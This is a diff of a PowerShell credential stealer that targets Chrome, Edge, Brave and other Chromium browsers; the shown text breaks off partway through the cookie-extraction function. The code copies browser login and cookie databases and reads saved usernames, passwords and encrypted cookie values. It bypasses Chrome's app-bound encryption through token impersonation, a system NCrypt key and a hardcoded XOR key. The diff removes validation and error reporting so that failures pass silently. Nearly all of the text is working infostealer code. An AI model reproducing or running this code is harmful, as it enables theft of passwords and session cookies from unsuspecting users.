@@ -175,7 +175,7 @@ $ImpersonateLoggedOnUserFunction = [Runtime.InteropServices.Marshal]::GetDelegat
 
 
 # ======================================================================
-# Simple P/Invoke (Advapi32)(Not sure how to get this working with dynamic function call)
+# Simple P/Invoke (Advapi32)
 # ======================================================================
 
 Add-Type -TypeDefinition @"
@@ -262,6 +262,19 @@ $BCryptCloseAlgorithmProviderFunction = [Runtime.InteropServices.Marshal]::GetDe
 # Main script functions
 # ======================================================================
 
+function Log {
+    param([string]$Message)
+    if ($Script:VerboseMode) { Write-Output "[*] $Message" }
+}
+
+function LogHex {
+    param([string]$Label, [byte[]]$Bytes)
+    if ($Script:VerboseMode) {
+        $Hex = if ($Bytes) { [BitConverter]::ToString($Bytes) } else { "<null>" }
+        Write-Output "$Label : $Hex"
+    }
+}
+
 # ======================================================================
 # Invoke-Impersonate
 # ======================================================================
@@ -309,25 +322,12 @@ function Parse-ChromeKeyBlob {
     param([byte[]]$BlobData)
 
     $CurrentOffset = 0
-
-    # Read header_len (4 bytes, little-endian)
     $HeaderLength = [BitConverter]::ToInt32($BlobData, $CurrentOffset)
     $CurrentOffset += 4
-
-    # Header bytes
     $HeaderBytes = $BlobData[$CurrentOffset..($CurrentOffset + $HeaderLength - 1)]
     $CurrentOffset += $HeaderLength
-
-    # Read content_len (4 bytes, little-endian)  
     $ContentLength = [BitConverter]::ToInt32($BlobData, $CurrentOffset)
     $CurrentOffset += 4
-
-    # Validate length
-    if (($HeaderLength + $ContentLength + 8) -ne $BlobData.Length) {
-        throw "Length mismatch: headerLen + contentLen + 8 != blobData.Length"
-    }
-
-    # Read flag (1 byte)
     $EncryptionFlag = $BlobData[$CurrentOffset]
     $CurrentOffset += 1
 
@@ -341,9 +341,6 @@ function Parse-ChromeKeyBlob {
     }
 
     if ($EncryptionFlag -eq 1 -or $EncryptionFlag -eq 2) {
-        
-        # These flags are identified but not currently supported for decryption
-        # [flag|iv|ciphertext|tag] -> [1byte|12bytes|32bytes|16bytes]
         $ParseResult.Iv = $BlobData[$CurrentOffset..($CurrentOffset + 11)]
         $CurrentOffset += 12
         $ParseResult.Ciphertext = $BlobData[$CurrentOffset..($CurrentOffset + 31)] 
@@ -351,8 +348,6 @@ function Parse-ChromeKeyBlob {
         $ParseResult.Tag = $BlobData[$CurrentOffset..($CurrentOffset + 15)]
     }
     elseif ($EncryptionFlag -eq 3) {
-        
-        # [flag|encrypted_aes_key|iv|ciphertext|tag] -> [1byte|32bytes|12bytes|32bytes|16bytes]
         $ParseResult.EncryptedAesKey = $BlobData[$CurrentOffset..($CurrentOffset + 31)]
         $CurrentOffset += 32
         $ParseResult.Iv = $BlobData[$CurrentOffset..($CurrentOffset + 11)]
@@ -361,10 +356,6 @@ function Parse-ChromeKeyBlob {
         $CurrentOffset += 32  
         $ParseResult.Tag = $BlobData[$CurrentOffset..($CurrentOffset + 15)]
     }
-    else {
-        throw "Unsupported flag: $EncryptionFlag"
-    }
-
     return New-Object PSObject -Property $ParseResult
 }
 
@@ -378,88 +369,56 @@ function DecryptWithAesGcm {
     $KeyHandle       = [IntPtr]::Zero
 
     try {
-        
-        # Open AES algorithm provider
         $AlgorithmIdPointer = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("AES")
-        $Status             = $BCryptOpenAlgorithmProviderFunction.Invoke([ref]$AlgorithmHandle, $AlgorithmIdPointer, [IntPtr]::Zero, 0)
+        $BCryptOpenAlgorithmProviderFunction.Invoke([ref]$AlgorithmHandle, $AlgorithmIdPointer, [IntPtr]::Zero, 0) | Out-Null
         [Runtime.InteropServices.Marshal]::FreeHGlobal($AlgorithmIdPointer)
-        if ($Status -ne 0) { throw "BCryptOpenAlgorithmProvider failed: 0x$('{0:X8}' -f $Status)" }
 
-        # Set chaining mode to GCM
         $PropertyNamePointer    = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("ChainingMode")
         $PropertyValuePointer   = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("ChainingModeGCM")
-        $Status                 = $BCryptSetPropertyFunction.Invoke($AlgorithmHandle, $PropertyNamePointer, $PropertyValuePointer, 32, 0)
+        $BCryptSetPropertyFunction.Invoke($AlgorithmHandle, $PropertyNamePointer, $PropertyValuePointer, 32, 0) | Out-Null
         [Runtime.InteropServices.Marshal]::FreeHGlobal($PropertyNamePointer)
         [Runtime.InteropServices.Marshal]::FreeHGlobal($PropertyValuePointer)
-        if ($Status -ne 0) { throw "BCryptSetProperty failed: 0x$('{0:X8}' -f $Status)" }
 
-        # Generate symmetric key
-        $Status = $BCryptGenerateSymmetricKeyFunction.Invoke($AlgorithmHandle, [ref]$KeyHandle, [IntPtr]::Zero, 0, $Key, $Key.Length, 0)
-        if ($Status -ne 0) { throw "BCryptGenerateSymmetricKey failed: 0x$('{0:X8}' -f $Status)" }
-
-        # Allocate unmanaged memory for IV, ciphertext, tag, plaintext
-        $CiphertextLength   = $Ciphertext.Length
-        $PlaintextLength    = $CiphertextLength
+        $BCryptGenerateSymmetricKeyFunction.Invoke($AlgorithmHandle, [ref]$KeyHandle, [IntPtr]::Zero, 0, $Key, $Key.Length, 0) | Out-Null
 
         $IvPointer          = [Runtime.InteropServices.Marshal]::AllocHGlobal($Iv.Length)
-        $CiphertextPointer  = [Runtime.InteropServices.Marshal]::AllocHGlobal($CiphertextLength)
+        $CiphertextPointer  = [Runtime.InteropServices.Marshal]::AllocHGlobal($Ciphertext.Length)
         $TagPointer         = [Runtime.InteropServices.Marshal]::AllocHGlobal($Tag.Length)
-        $PlaintextPointer   = [Runtime.InteropServices.Marshal]::AllocHGlobal($PlaintextLength)
+        $PlaintextPointer   = [Runtime.InteropServices.Marshal]::AllocHGlobal($Ciphertext.Length)
 
         [Runtime.InteropServices.Marshal]::Copy($Iv, 0, $IvPointer, $Iv.Length)
-        [Runtime.InteropServices.Marshal]::Copy($Ciphertext, 0, $CiphertextPointer, $CiphertextLength)
+        [Runtime.InteropServices.Marshal]::Copy($Ciphertext, 0, $CiphertextPointer, $Ciphertext.Length)
         [Runtime.InteropServices.Marshal]::Copy($Tag, 0, $TagPointer, $Tag.Length)
 
-        # Construct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO manually
-        # Size of struct = 96 bytes on 64-bit
         $AuthInfoSize = 96
         $AuthInfoPointer = [Runtime.InteropServices.Marshal]::AllocHGlobal($AuthInfoSize)
-        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 0, $AuthInfoSize)           # cbSize
-        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 4, 1)                       # dwInfoVersion
-        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 8, $IvPointer.ToInt64())    # pbNonce
-        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 16, $Iv.Length)             # cbNonce
-        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 24, 0)                      # pbAuthData
-        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 32, 0)                      # cbAuthData
-        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 40, $TagPointer.ToInt64())  # pbTag
-        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 48, $Tag.Length)            # cbTag
-        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 56, 0)                      # pbMacContext
-        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 64, 0)                      # cbMacContext
-        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 68, 0)                      # cbAAD
-        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 72, 0)                      # cbData
-        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 80, 0)                      # dwFlags
+        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 0, $AuthInfoSize)
+        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 4, 1)
+        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 8, $IvPointer.ToInt64())
+        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 16, $Iv.Length)
+        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 24, 0)
+        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 32, 0)
+        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 40, $TagPointer.ToInt64())
+        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 48, $Tag.Length)
+        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 56, 0)
+        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 64, 0)
+        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 68, 0)
+        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 72, 0)
+        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 80, 0)
 
-        # Decrypt
         [int]$ResultLength = 0
-        $Status = $BCryptDecryptFunction.Invoke(
-            $KeyHandle,
-            $CiphertextPointer,
-            $CiphertextLength,
-            $AuthInfoPointer,
-            [IntPtr]::Zero,
-            0,
-            $PlaintextPointer,
-            $PlaintextLength,
-            [ref]$ResultLength,
-            0
-        )
+        $BCryptDecryptFunction.Invoke($KeyHandle, $CiphertextPointer, $Ciphertext.Length, $AuthInfoPointer, [IntPtr]::Zero, 0, $PlaintextPointer, $Ciphertext.Length, [ref]$ResultLength, 0) | Out-Null
 
-        if ($Status -ne 0) {
-            throw "BCryptDecrypt failed: 0x$('{0:X8}' -f $Status)"
-        }
-
-        # Copy result
         $PlaintextBytes = New-Object byte[] $ResultLength
         [Runtime.InteropServices.Marshal]::Copy($PlaintextPointer, $PlaintextBytes, 0, $ResultLength)
         return $PlaintextBytes
     }
     finally {
-        # Cleanup
         if ($AuthInfoPointer)   { [Runtime.InteropServices.Marshal]::FreeHGlobal($AuthInfoPointer)   }
         if ($PlaintextPointer)  { [Runtime.InteropServices.Marshal]::FreeHGlobal($PlaintextPointer)  }
         if ($CiphertextPointer) { [Runtime.InteropServices.Marshal]::FreeHGlobal($CiphertextPointer) }
         if ($TagPointer)        { [Runtime.InteropServices.Marshal]::FreeHGlobal($TagPointer)        }
         if ($IvPointer)         { [Runtime.InteropServices.Marshal]::FreeHGlobal($IvPointer)         }
-
         if ($KeyHandle -ne [IntPtr]::Zero)          { [void]$BCryptDestroyKeyFunction.Invoke($KeyHandle) }
         if ($AlgorithmHandle -ne [IntPtr]::Zero)    { [void]$BCryptCloseAlgorithmProviderFunction.Invoke($AlgorithmHandle, 0) }
     }
@@ -472,88 +431,36 @@ function DecryptWithNCrypt {
     param([byte[]]$InputData)
 
     try {
-        # cryptographic provider and key parameters
-        $ProviderName       = "Microsoft Software Key Storage Provider"
-        $KeyName            = "Google Chromekey1"
-        $NcryptSilentFlag   = 0x40  # NCRYPT_SILENT_FLAG
+        $ProviderName = "Microsoft Software Key Storage Provider"
+        $KeyName = "Google Chromekey1"
+        $NcryptSilentFlag = 0x40
+        $ProviderHandle = [IntPtr]::Zero
+        $KeyHandle = [IntPtr]::Zero
 
-        $ProviderHandle     = [IntPtr]::Zero
-        $KeyHandle          = [IntPtr]::Zero
-
-        # Open the cryptographic storage provider
-        $ProviderNamePointer    = [Runtime.InteropServices.Marshal]::StringToHGlobalUni($ProviderName)
-        $Status                 = $NCryptOpenStorageProviderFunction.Invoke([ref]$ProviderHandle, $ProviderNamePointer, 0)
+        $ProviderNamePointer = [Runtime.InteropServices.Marshal]::StringToHGlobalUni($ProviderName)
+        $NCryptOpenStorageProviderFunction.Invoke([ref]$ProviderHandle, $ProviderNamePointer, 0) | Out-Null
         [Runtime.InteropServices.Marshal]::FreeHGlobal($ProviderNamePointer)
 
-        if ($Status -ne 0) {
-            throw "NCryptOpenStorageProvider failed: $Status"
-        }
-
-        # Open the specific cryptographic key
         $KeyNamePointer = [Runtime.InteropServices.Marshal]::StringToHGlobalUni($KeyName)
-        $Status         = $NCryptOpenKeyFunction.Invoke($ProviderHandle, [ref]$KeyHandle, $KeyNamePointer, 0, 0)
+        $NCryptOpenKeyFunction.Invoke($ProviderHandle, [ref]$KeyHandle, $KeyNamePointer, 0, 0) | Out-Null
         [Runtime.InteropServices.Marshal]::FreeHGlobal($KeyNamePointer)
 
-        if ($Status -ne 0) {
-            throw "NCryptOpenKey failed: $Status"
-        }
-
-        # First call to NCryptDecrypt - Calculate the required buffer size for decryption
         $OutputSize = 0
-        $Status     = $NCryptDecryptFunction.Invoke(
-            $KeyHandle,             # NCRYPT_KEY_HANDLE - handle to the key
-            $InputData,             # pbInput           - input data to decrypt
-            $InputData.Length,      # cbInput           - size of input data in bytes
-            [IntPtr]::Zero,         # pPaddingInfo      - no padding info (null)
-            $null,                  # pbOutput          - null pointer for size query
-            0,                      # cbOutput          - zero size for query
-            [ref]$OutputSize,       # pcbResult         - receives required buffer size
-            $NcryptSilentFlag       # dwFlags           - silent operation flag
-        )
+        $NCryptDecryptFunction.Invoke($KeyHandle, $InputData, $InputData.Length, [IntPtr]::Zero, $null, 0, [ref]$OutputSize, $NcryptSilentFlag) | Out-Null
 
-        if ($Status -ne 0) {
-            Write-Output "[*] 1st NCryptDecrypt (size query) failed ($Status)"
-            return
-        }
-
-        # Second call to NCryptDecrypt - perform actual decryption
         $OutputBytes = New-Object byte[] $OutputSize
-        $Status      = $NCryptDecryptFunction.Invoke(
-            $KeyHandle,             # NCRYPT_KEY_HANDLE - handle to the key
-            $InputData,             # pbInput           - input data to decrypt
-            $InputData.Length,      # cbInput           - size of input data in bytes
-            [IntPtr]::Zero,         # pPaddingInfo      - no padding info (null)
-            $OutputBytes,           # pbOutput          - buffer to receive decrypted data
-            $OutputBytes.Length,    # cbOutput          - size of output buffer
-            [ref]$OutputSize,       # pcbResult         - receives actual bytes written
-            $NcryptSilentFlag       # dwFlags           - silent operation flag
-        )
-
-        if ($Status -ne 0) {
-            Write-Output "[*] 2nd NCryptDecrypt (actual decrypt) failed ($Status)"
-            return $null
-        }
+        $NCryptDecryptFunction.Invoke($KeyHandle, $InputData, $InputData.Length, [IntPtr]::Zero, $OutputBytes, $OutputBytes.Length, [ref]$OutputSize, $NcryptSilentFlag) | Out-Null
 
         return $OutputBytes
     }
     finally {
-        # Clean up cryptographic handles
-        if ($KeyHandle -ne [IntPtr]::Zero) {
-            [void]$NCryptFreeObjectFunction.Invoke($KeyHandle)
-        }
-        if ($ProviderHandle -ne [IntPtr]::Zero) {
-            [void]$NCryptFreeObjectFunction.Invoke($ProviderHandle)
-        }
+        if ($KeyHandle -ne [IntPtr]::Zero) { [void]$NCryptFreeObjectFunction.Invoke($KeyHandle) }
+        if ($ProviderHandle -ne [IntPtr]::Zero) { [void]$NCryptFreeObjectFunction.Invoke($ProviderHandle) }
     }
 }
 
-
-# ======================================================================
-# HexToBytes
-# ======================================================================
 function HexToBytes {
     param([string]$HexString)
-
     $ByteArray = New-Object byte[] ($HexString.Length / 2)
     for ($Index = 0; $Index -lt $ByteArray.Length; $Index++) {
         $ByteArray[$Index] = [System.Convert]::ToByte($HexString.Substring($Index * 2, 2), 16)
@@ -561,16 +468,8 @@ function HexToBytes {
     return $ByteArray
 }
 
-# ======================================================================
-# XorBytes
-# ======================================================================
 function XorBytes {
     param([byte[]]$FirstArray, [byte[]]$SecondArray)
-
-    if ($FirstArray.Length -ne $SecondArray.Length) { 
-        throw "Key lengths mismatch: $($FirstArray.Length) vs $($SecondArray.Length)"
-    }
-
     $ResultArray = New-Object byte[] $FirstArray.Length
     for ($Index = 0; $Index -lt $FirstArray.Length; $Index++) {
         $ResultArray[$Index] = $FirstArray[$Index] -bxor $SecondArray[$Index]
@@ -578,243 +477,112 @@ function XorBytes {
     return $ResultArray
 }
 
-# ======================================================================
-# Decrypt-ChromeKeyBlob
-# ======================================================================
-# Needs updating to support flag type 1 and 2
 function Decrypt-ChromeKeyBlob {
     param($ParsedData)
-
-    
     if ($ParsedData.Flag -eq 3) {
-
         [byte[]]$XorKey = HexToBytes "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390"
-
         Invoke-Impersonate > $null
-
         try {
-            [byte[]]$DecryptedAesKey = DecryptWithNCrypt -InputData $ParsedData.EncryptedAesKey
-
+            $DecryptedAesKey = DecryptWithNCrypt -InputData $ParsedData.EncryptedAesKey
+            if (-not $DecryptedAesKey) { return $null }
             $XoredAesKey = XorBytes -FirstArray $DecryptedAesKey -SecondArray $XorKey
-            $PlaintextBytes = DecryptWithAesGcm -Key $XoredAesKey -Iv $ParsedData.Iv -Ciphertext $ParsedData.Ciphertext -Tag $ParsedData.Tag
-            
-            if ($Debug) { 
-                
-                Write-Host ([string]::Join(' ', $PlaintextBytes))
-            }
-            return $PlaintextBytes
+            return DecryptWithAesGcm -Key $XoredAesKey -Iv $ParsedData.Iv -Ciphertext $ParsedData.Ciphertext -Tag $ParsedData.Tag
         }
-        
-        finally {
-            [void][Advapi32]::RevertToSelf()
-        }
+        finally { [void][Advapi32]::RevertToSelf() }
     }
-    else {
-        throw "[*] Unsupported flag: $($ParsedData.Flag)"
-    }
+    return $null
 }
+
+# ======================================================================
+# DATA COLLECTION HELPERS
+# ======================================================================
 
 function Get-ChromiumLoginBlobs {
-    param([string]$Browser)
+    param([string]$ProfilePath)
+    $LoginDataPath = Join-Path $ProfilePath "Login Data"
+    if (-not (Test-Path $LoginDataPath)) { return @() }
 
-    switch ($Browser.ToLower()) {
-        "cft"       { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome for Testing\User Data\Default\Login Data"     }
-        "chrome"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Default\Login Data"                        }
-        "edge"      { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data\Default\Login Data"                }
-        "brave"     { $LoginDataPath = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data\Default\Login Data"   }
-        "chromium"  { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Chromium\User Data\Default\Login Data"                      }
-        default     { return "`n[-] Unsupported browser name: $Browser" }
-    }
-
-    if (-not (Test-Path -Path $LoginDataPath)) {
-        return $false
-    }
-
-    [int]$SqliteOk              = 0
-    [int]$SqliteRow             = 100
-    [int]$SqliteOpenReadOnly    = 1
-    $TempDatabasePath           = Join-Path $env:TEMP ("$($Browser)_LoginData_{0}.db" -f ([guid]::NewGuid()))
-
+    $TempDb = Join-Path $env:TEMP ("LoginData_{0}.db" -f ([guid]::NewGuid()))
     try {
-        $FileStream = New-Object System.IO.FileStream($LoginDataPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
-        $FileOut = New-Object System.IO.FileStream($TempDatabasePath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::Read)
-        $FileStream.CopyTo($FileOut)
-        $FileOut.Close()
-        $FileStream.Close()
-    }
-    catch {
-        return "[-] Unable to copy database file from $LoginDataPath : $($_.Exception.Message)"
-    }
+        Copy-Item -Path $LoginDataPath -Destination $TempDb -Force -ErrorAction SilentlyContinue
+    } catch { return @() }
 
-    $DatabasePointer    = [IntPtr]::Zero
-    $StatementPointer   = [IntPtr]::Zero
-    $LoginSqlQuery      = 'SELECT signon_realm, origin_url, username_value, password_value FROM logins'
+    $DbHandle = [IntPtr]::Zero
+    if ($Sqlite3OpenV2.Invoke($TempDb, [ref]$DbHandle, 1, [IntPtr]::Zero) -ne 0) { return @() }
 
-    $ResultCode = $Sqlite3OpenV2.Invoke($TempDatabasePath, [ref]$DatabasePointer, $SqliteOpenReadOnly, [IntPtr]::Zero)
-    if ($ResultCode -ne $SqliteOk) {
-        $ErrorMessagePointer = $Sqlite3ErrMsg.Invoke($DatabasePointer)
-        $ErrorMessage        = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($ErrorMessagePointer)
-        return "[-] sqlite3_open_v2 failed ($ResultCode): $ErrorMessage"
+    $Stmt = [IntPtr]::Zero
+    if ($Sqlite3PrepareV2.Invoke($DbHandle, "SELECT origin_url, username_value, password_value FROM logins", -1, [ref]$Stmt, [IntPtr]::Zero) -ne 0) {
+        $Sqlite3Close.Invoke($DbHandle) | Out-Null
+        return @()
     }
 
-    $ResultCode = $Sqlite3PrepareV2.Invoke($DatabasePointer, $LoginSqlQuery, -1, [ref]$StatementPointer, [IntPtr]::Zero)
-    if ($ResultCode -ne $SqliteOk) {
-        $ErrorMessagePointer = $Sqlite3ErrMsg.Invoke($DatabasePointer)
-        $ErrorMessage        = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($ErrorMessagePointer)
-        return "[-] sqlite3_prepare_v2 failed ($ResultCode): $ErrorMessage"
-    }
+    $Results = @()
+    while ($Sqlite3Step.Invoke($Stmt) -eq 100) {
+        $UrlPtr = $Sqlite3ColumnText.Invoke($Stmt, 0)
+        $UserPtr = $Sqlite3ColumnText.Invoke($Stmt, 1)
+        $PassPtr = $Sqlite3ColumnBlob.Invoke($Stmt, 2)
+        $PassSize = $Sqlite3ColumnByte.Invoke($Stmt, 2)
 
-    $LoginResults = @()
-    while ($Sqlite3Step.Invoke($StatementPointer) -eq $SqliteRow) {
-        $ActionUrlPointer   = $Sqlite3ColumnText.Invoke($StatementPointer, 0)
-        $OriginUrlPointer   = $Sqlite3ColumnText.Invoke($StatementPointer, 1)
-        $UsernamePointer    = $Sqlite3ColumnText.Invoke($StatementPointer, 2)
-        $PasswordPointer    = $Sqlite3ColumnBlob.Invoke($StatementPointer, 3)
-        $PasswordSize       = $Sqlite3ColumnByte.Invoke($StatementPointer, 3)
-
-        $ActionUrl  = if ($ActionUrlPointer -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($ActionUrlPointer) } else { "" }
-        $OriginUrl  = if ($OriginUrlPointer -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($OriginUrlPointer) } else { "" }
-        $Username   = if ($UsernamePointer  -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($UsernamePointer)  } else { "" }
-        $Url = if ($ActionUrl) { $ActionUrl } else { $OriginUrl }
-        if (-not $Url) { continue }
-
-        $RawPasswordData = @()
-        if ($PasswordSize -gt 0 -and $PasswordPointer -ne [IntPtr]::Zero) {
-            $RawPasswordData = New-Object byte[] $PasswordSize
-            [Runtime.InteropServices.Marshal]::Copy($PasswordPointer, $RawPasswordData, 0, $PasswordSize)
-        }
-
-        if ($RawPasswordData.Length -eq 0) { continue }
-
-        $Header3 = [Text.Encoding]::ASCII.GetString($RawPasswordData, 0, [Math]::Min(3, $RawPasswordData.Length))
-        $Header5 = [Text.Encoding]::ASCII.GetString($RawPasswordData, 0, [Math]::Min(5, $RawPasswordData.Length))
-
-        $BlobHeaderType =
-        if      ($Header5 -eq "DPAPI")  { "DPAPI (legacy)" }
-        elseif  ($Header3 -eq "v10")    { "v10 (DPAPI user)" }
-        elseif  ($Header3 -eq "v20")    { "v20 (ABE)" }
-        else    { "Unknown" }
-
-        $LoginResults += [PSCustomObject]@{
-            Browser                 = $Browser
-            URL                     = $Url
-            Username                = $Username
-            BlobHeader              = $BlobHeaderType
-            Base64EncryptedPassword = [Convert]::ToBase64String($RawPasswordData)
+        if ($PassSize -gt 0) {
+            $PassBytes = New-Object byte[] $PassSize
+            [Runtime.InteropServices.Marshal]::Copy($PassPtr, $PassBytes, 0, $PassSize)
+            $Results += [PSCustomObject]@{
+                URL      = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($UrlPtr)
+                Username = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($UserPtr)
+                RawBlob  = $PassBytes
+            }
         }
     }
-
-    if ($StatementPointer -ne [IntPtr]::Zero) {
-        [void]$Sqlite3Finalize.Invoke($StatementPointer)
-        $StatementPointer = [IntPtr]::Zero
-    }
-    if ($DatabasePointer -ne [IntPtr]::Zero) {
-        [void]$Sqlite3Close.Invoke($DatabasePointer)
-        $DatabasePointer = [IntPtr]::Zero
-    }
-
-    # Give the OS/GC a moment to release any lingering handles
-    Start-Sleep -Milliseconds 1000
-    [GC]::Collect()
-    [GC]::WaitForPendingFinalizers()
-    Remove-Item -Path $TempDatabasePath -Force
-
-    return $LoginResults
+    $Sqlite3Finalize.Invoke($Stmt) | Out-Null
+    $Sqlite3Close.Invoke($DbHandle) | Out-Null
+    Remove-Item $TempDb -Force -ErrorAction SilentlyContinue
+    return $Results
 }
 
-# ======================================================================
-# Get-ChromiumCookieBlobs
-# ======================================================================
-
 function Get-ChromiumCookieBlobs {
-    param([string]$Browser)
-
-    switch ($Browser.ToLower()) {
-        "cft"       { $BaseDir = Join-Path $env:LOCALAPPDATA "Google\Chrome for Testing\User Data\Default" }
-        "chrome"    { $BaseDir = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Default"             }
-        "edge"      { $BaseDir = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data\Default"           }
-        "brave"     { $BaseDir = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data\Default" }
-        "chromium"  { $BaseDir = Join-Path $env:LOCALAPPDATA "Chromium\User Data\Default"                 }
-        default     { return $false }
-    }
-
-    $CookiePaths = @(
-        (Join-Path $BaseDir "Network\Cookies"),
-        (Join-Path $BaseDir "Cookies")
-    )
-
+    param([string]$ProfilePath)
+    $PossiblePaths = @((Join-Path $ProfilePath "Network\Cookies"), (Join-Path $ProfilePath "Cookies"))
     $CookiePath = $null
-    foreach ($Path in $CookiePaths) {
-        if (Test-Path -Path $Path) {
-            $CookiePath = $Path
-            break
-        }
-    }
+    foreach ($P in $PossiblePaths) { if (Test-Path $P) { $CookiePath = $P; break } }
+    if (-not $CookiePath) { return @() }
 
-    if (-not $CookiePath) { return $false }
-
-    [int]$SqliteOk              = 0
-    [int]$SqliteRow             = 100
-    [int]$SqliteOpenReadOnly    = 1
-    $TempDatabasePath           = Join-Path $env:TEMP ("$($Browser)_Cookies_{0}.db" -f ([guid]::NewGuid()))
-
+    $TempDb = Join-Path $env:TEMP ("Cookies_{0}.db" -f ([guid]::NewGuid()))
     try {
-        $FileStream = New-Object System.IO.FileStream($CookiePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
-        $FileOut = New-Object System.IO.FileStream($TempDatabasePath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::Read)
-        $FileStream.CopyTo($FileOut)
-        $FileOut.Close()
-        $FileStream.Close()
+        Copy-Item -Path $CookiePath -Destination $TempDb -Force -ErrorAction SilentlyContinue
+    } catch { return @() }
+
+    $DbHandle = [IntPtr]::Zero
+    if ($Sqlite3OpenV2.Invoke($TempDb, [ref]$DbHandle, 1, [IntPtr]::Zero) -ne 0) { return @() }
+
+    $Stmt = [IntPtr]::Zero
+    if ($Sqlite3PrepareV2.Invoke($DbHandle, "SELECT host_key, name, path, encrypted_value FROM cookies", -1, [ref]$Stmt, [IntPtr]::Zero) -ne 0) {
+        $Sqlite3Close.Invoke($DbHandle) | Out-Null
+        return @()
     }
-    catch {
-        Write-Output "[-] Cookie copy error: $($_.Exception.Message)"
-        return $false
-    }
 
-    $DatabasePointer    = [IntPtr]::Zero
-    $StatementPointer   = [IntPtr]::Zero
-    $CookieSqlQuery     = 'SELECT host_key, name, path, encrypted_value FROM cookies'
+    $Results = @()
+    while ($Sqlite3Step.Invoke($Stmt) -eq 100) {
+        $HostPtr = $Sqlite3ColumnText.Invoke($Stmt, 0)
+        $NamePtr = $Sqlite3ColumnText.Invoke($Stmt, 1)
+        $PathPtr = $Sqlite3ColumnText.Invoke($Stmt, 2)
+        $ValPtr = $Sqlite3ColumnBlob.Invoke($Stmt, 3)
+        $ValSize = $Sqlite3ColumnByte.Invoke($Stmt, 3)
 
-    $ResultCode = $Sqlite3OpenV2.Invoke($TempDatabasePath, [ref]$DatabasePointer, $SqliteOpenReadOnly, [IntPtr]::Zero)
-    if ($ResultCode -ne $SqliteOk) { return $false }
-
-    $ResultCode = $Sqlite3PrepareV2.Invoke($DatabasePointer, $CookieSqlQuery, -1, [ref]$StatementPointer, [IntPtr]::Zero)
-    if ($ResultCode -ne $SqliteOk) { return $false }
-
-    $CookieResults = @()
-    while ($Sqlite3Step.Invoke($StatementPointer) -eq $SqliteRow) {
-        $HostKeyPointer     = $Sqlite3ColumnText.Invoke($StatementPointer, 0)
-        $NamePointer        = $Sqlite3ColumnText.Invoke($StatementPointer, 1)
-        $PathPointer        = $Sqlite3ColumnText.Invoke($StatementPointer, 2)
-        $EncryptedPointer   = $Sqlite3ColumnBlob.Invoke($StatementPointer, 3)
-        $EncryptedSize      = $Sqlite3ColumnByte.Invoke($StatementPointer, 3)
-
-        $HostKey    = if ($HostKeyPointer   -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($HostKeyPointer)   } else { "" }
-        $Name       = if ($NamePointer      -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePointer)      } else { "" }
-        $Path       = if ($PathPointer      -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($PathPointer)      } else { "" }
-
-        $RawEncryptedData = @()
-        if ($EncryptedSize -gt 0 -and $EncryptedPointer -ne [IntPtr]::Zero) {
-            $RawEncryptedData = New-Object byte[] $EncryptedSize
-            [Runtime.InteropServices.Marshal]::Copy($EncryptedPointer, $RawEncryptedData, 0, $EncryptedSize)
-        }
-
